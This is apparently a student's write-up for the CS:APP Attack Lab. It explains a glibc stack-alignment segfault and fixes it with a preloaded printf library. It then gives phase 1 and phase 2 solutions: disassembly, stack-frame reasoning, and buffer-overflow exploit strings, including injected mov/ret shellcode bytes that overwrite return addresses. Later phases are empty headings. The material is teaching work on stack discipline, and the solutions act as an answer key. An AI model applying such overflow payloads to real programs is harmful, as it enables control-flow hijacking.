# Attack Lab
## Table of contents
- [Introduction](#introduction)
- [Duration](#duration)
- [`ctarget` segmentation fault bug on Ubuntu 22.04](#ctarget-segmentation-fault-bug-on-ubuntu-2204)

- [Solution](#solution)
    - [Phase 1](#phase-1)
    - [Phase 2](#phase-2)
    - [Phase 3](#phase-3)
    - [Phase 4](#phase-4)
    - [Phase 5](#phase-5)

## Introduction
- Note: This is the 64-bit successor to the 32-bit Buffer Lab

- Students are given a pair of unique custom-generated x86-64 binary executables, called **targets**, that have buffer overflow bugs
    - One target is vulnerable to code injection attacks
    
    - The other is vulnerable to return-oriented programming attacks
    
    - Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming
    
- This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks

- If you're a self-study student, here are a pair of Ubuntu 12.4 targets that you can try out for yourself
    - You'll need to run your targets using the `-q` option so that they don't try to contact a non-existent grading server
    
    - If you're an instructor with a CS:APP acount, you can download the solutions here

## Duration
- 2025/2/19 - Due: 2025/2/28

## `ctarget` segmentation fault bug on Ubuntu 22.04
- No matter what strings you input or whether or not you input string, the `ctarget` will always cause segmentation fault

    ```
    (gdb) run -q
    Starting program: /home/yuchuan/projects/computer_systems_a_programmer_perspective/labs/attack_lab/target1/ctarget -q
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Cookie: 0x59b997fa

    Program received signal SIGSEGV, Segmentation fault.
    0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:", ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
    1244    ./stdio-common/vfprintf-internal.c: No such file or directory.

    (gdb) backtrace
    #0  0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:", ap=ap@entry=0x5561dbd8, 
        mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
    #1  0x00007ffff7ebec4b in ___printf_chk (flag=flag@entry=1, format=format@entry=0x4032b4 "Type string:") at ./debug/printf_chk.c:33
    #2  0x0000000000401f10 in printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
    #3  launch (offset=<optimized out>) at support.c:293
    #4  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
    Backtrace stopped: Cannot access memory at address 0x55686000
    ```

- Based on [Rijuyuezhu's blog](https://blog.rijuyuezhu.top/posts/db646f34/), it is due to an instruction in `__vfprintf_internal` of `glibc`, namely `movaps %xmm1, 0x10(%rsp)`
    - This instruction needs its memory operand `0x10(%rsp)` corresponding an address divisible by 16
    
    - I guess that due to the compiling of `ctarget` is on a old convention, where the size of function frame is not strictly required to be a multiple of 16
    
    - I tried to manually modify the low bits of `%rsp` through `gdb`, and it eliminates the `SIGSEGV`, confirming my guessing

- Get self-made `printf.so`
    - First of all, we can find a naive `printf` implementation (For me, I use the programming homework in NJU PA)
    
    - Then we can compile it to be a shared library(suppose the source file is named `printf.c`):

        ```
        gcc -shared -fPIC -o printf.so printf.c
        ```

    - Notice that we shall provide interface `__printf_chk` and `__sprintf_chk`

- Use the `LD_PRELOAD` to substitute the default `glibc` shared library
    - Put `printf.so` in the same directory of `ctarget`, then use command

        ```
        LD_PRELOAD=./printf.so ./ctarget -q
        ```

    - And it works! 

- **What is the relation between the self-made `printf.so` and `movaps` instruction?**
    - Does self-made `printf.so` ensure the stack frame address satisfy a 16-byte alignment?

- How to use `gdb` with `LD_PRELOAD`

    ```
    gdb your_program

    (gdb) set environment LD_PRELOAD ./printf.so
    (gdb) start
    ```

## Solution
- Disassemble `ctarget` and store it in the file [`ctarget_disassemble`](./target1/ctarget_disassemble)

    ```
    objdump -d ctarget > ctarget_disassemble
    ```
### Phase 1
- `getbuf`
    - The machine code

        ```
        00000000004017a8 <getbuf>:
        4017a8:	48 83 ec 28          	sub    $0x28,%rsp
        4017ac:	48 89 e7             	mov    %rsp,%rdi
        4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
        4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
        4017b9:	48 83 c4 28          	add    $0x28,%rsp
        4017bd:	c3                   	ret    
        4017be:	90                   	nop
        4017bf:	90                   	nop
        ```
    
    - The stack frame

        ![](./images/getbuf_stack_frame.png)

- `touch1`
    - The machine code

        ```
        00000000004017c0 <touch1>:
        4017c0:	48 83 ec 08          	sub    $0x8,%rsp
        4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
        4017cb:	00 00 00 
        4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
        4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
        4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
        4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
        4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
        4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
        ```

- We need to fill 0x28 (40) bytes of `getbuf` stack frame and then overwrite the return address to `touch1` first instruction address
    - [Exploit string](./target1/phase_1_exploit.txt)

    - Generate [exploit raw string](./target1/phase_1_exploit_rax.txt)

        ```
        ./hex2raw < phase_1_exploit.txt > phase_1_exploit_rax.txt
        ```

    - Apply the raw string to `ctarget`

        ```
        LD_PRELOAD=./printf.so ./ctarget -q -i phase_1_exploit_rax.txt
        ```

### Phase 2
- `launch`

    ```
    0000000000401eb4 <launch>:
    401eb4:	55                   	push   %rbp
    401eb5:	48 89 e5             	mov    %rsp,%rbp
    401eb8:	48 83 ec 10          	sub    $0x10,%rsp
    401ebc:	48 89 fa             	mov    %rdi,%rdx
    401ebf:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    401ec6:	00 00 
    401ec8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    401ecc:	31 c0                	xor    %eax,%eax
    401ece:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
    401ed2:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
    401ed6:	48 29 c4             	sub    %rax,%rsp
    401ed9:	48 8d 7c 24 0f       	lea    0xf(%rsp),%rdi
    401ede:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
    401ee2:	be f4 00 00 00       	mov    $0xf4,%esi
    401ee7:	e8 14 ee ff ff       	call   400d00 <memset@plt>
    401eec:	48 8b 05 ad 25 20 00 	mov    0x2025ad(%rip),%rax        # 6044a0 <stdin@GLIBC_2.2.5>
    401ef3:	48 39 05 d6 25 20 00 	cmp    %rax,0x2025d6(%rip)        # 6044d0 <infile>
    401efa:	75 14                	jne    401f10 <launch+0x5c>
    401efc:	be b4 32 40 00       	mov    $0x4032b4,%esi
    401f01:	bf 01 00 00 00       	mov    $0x1,%edi
    401f06:	b8 00 00 00 00       	mov    $0x0,%eax
    401f0b:	e8 e0 ee ff ff       	call   400df0 <__printf_chk@plt>
    401f10:	c7 05 c2 25 20 00 00 	movl   $0x0,0x2025c2(%rip)        # 6044dc <vlevel>
    401f17:	00 00 00 
    401f1a:	b8 00 00 00 00       	mov    $0x0,%eax
    401f1f:	e8 44 fa ff ff       	call   401968 <test>
    401f24:	83 3d bd 25 20 00 00 	cmpl   $0x0,0x2025bd(%rip)        # 6044e8 <is_checker>
    401f2b:	74 14                	je     401f41 <launch+0x8d>
    401f2d:	bf c1 32 40 00       	mov    $0x4032c1,%edi
    401f32:	e8 89 ed ff ff       	call   400cc0 <puts@plt>
    401f37:	b8 00 00 00 00       	mov    $0x0,%eax
    401f3c:	e8 ca fa ff ff       	call   401a0b <check_fail>
    401f41:	bf cc 32 40 00       	mov    $0x4032cc,%edi
    401f46:	e8 75 ed ff ff       	call   400cc0 <puts@plt>
    401f4b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    401f4f:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
    401f56:	00 00 
    401f58:	74 05                	je     401f5f <launch+0xab>
    401f5a:	e8 81 ed ff ff       	call   400ce0 <__stack_chk_fail@plt>
    401f5f:	c9                   	leave  
    401f60:	c3                   	ret    

    ```
- `test`

    ```
    0000000000401968 <test>:
    401968:	48 83 ec 08          	sub    $0x8,%rsp
    40196c:	b8 00 00 00 00       	mov    $0x0,%eax
    401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
    401976:	89 c2                	mov    %eax,%edx
    401978:	be 88 31 40 00       	mov    $0x403188,%esi
    40197d:	bf 01 00 00 00       	mov    $0x1,%edi
    401982:	b8 00 00 00 00       	mov    $0x0,%eax
    401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
    40198c:	48 83 c4 08          	add    $0x8,%rsp
    401990:	c3                   	ret    
    401991:	90                   	nop
    401992:	90                   	nop
    401993:	90                   	nop
    401994:	90                   	nop
    401995:	90                   	nop
    401996:	90                   	nop
    401997:	90                   	nop
    401998:	90                   	nop
    401999:	90                   	nop
    40199a:	90                   	nop
    40199b:	90                   	nop
    40199c:	90                   	nop
    40199d:	90                   	nop
    40199e:	90                   	nop
    40199f:	90                   	nop
    ```
- `touch2`

    ```
    00000000004017ec <touch2>:
    4017ec:	48 83 ec 08          	sub    $0x8,%rsp
    4017f0:	89 fa                	mov    %edi,%edx
    4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
    4017f9:	00 00 00 
    4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
    401802:	75 20                	jne    401824 <touch2+0x38>
    401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
    401809:	bf 01 00 00 00       	mov    $0x1,%edi
    40180e:	b8 00 00 00 00       	mov    $0x0,%eax
    401813:	e8 d8 f5 ff ff       	call   400df0 <__printf_chk@plt>
    401818:	bf 02 00 00 00       	mov    $0x2,%edi
    40181d:	e8 6b 04 00 00       	call   401c8d <validate>
    401822:	eb 1e                	jmp    401842 <touch2+0x56>
    401824:	be 10 31 40 00       	mov    $0x403110,%esi
    401829:	bf 01 00 00 00       	mov    $0x1,%edi
    40182e:	b8 00 00 00 00       	mov    $0x0,%eax
    401833:	e8 b8 f5 ff ff       	call   400df0 <__printf_chk@plt>
    401838:	bf 02 00 00 00       	mov    $0x2,%edi
    40183d:	e8 0d 05 00 00       	call   401d4f <fail>
    401842:	bf 00 00 00 00       	mov    $0x0,%edi
    401847:	e8 f4 f5 ff ff       	call   400e40 <exit@plt>
    ```

- The stack frame is as follows

    ![](./images/phase_2_stack_frame.png)

- We can't insert the exploit code into `getbuf` stack frame, because when `ret` is executed, the stack frame has been released by increasing the value of `%rsp`

- Therefore, we insert the exploit code which contains `mov` and `ret` instructions at the address of the return address in `launch` stack frame
    - `rsp` is `0x5561dc78`

        ```
        (gdb) print /x $rsp
        $1 = 0x5561dc78
        ```

    - The address is `%rsp + 0x28 + 0x8 +0x8 = 0x5561dcb0`

        ```
        (gdb) x/gx 0x5561dcb0
        0x5561dcb0:     0x0000000000401f24
        ```

- The exploit code is to move cookie value to register `%rdi` which is shown in [mov_rdi.s](./target1/phase_2/mov_rdi.s) and `ret` instruction

- We insert the `touch2` function first instruction address to the stack frame in `test` function

- After the `getbuf` executes `ret` instruction, the code transfers the control to the exploit code, executes `mov` and `ret` instructions, and transfers the control to `touch2`

- The phase 2 exploit string is

    ```
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00 /* 40 bytes to fill the stack frame of getbuf */
    b0 dc 61 55 00 00 00 00 /* position of return address of launch function */
    ec 17 40 00 00 00 00 00 /* touch2 first instruction address */
    bf fa 97 b9 59 c3 00 00 /* mov $0x59b997fa,%edi  ret */
    ```
### Phase 3
### Phase 4
### Phase 5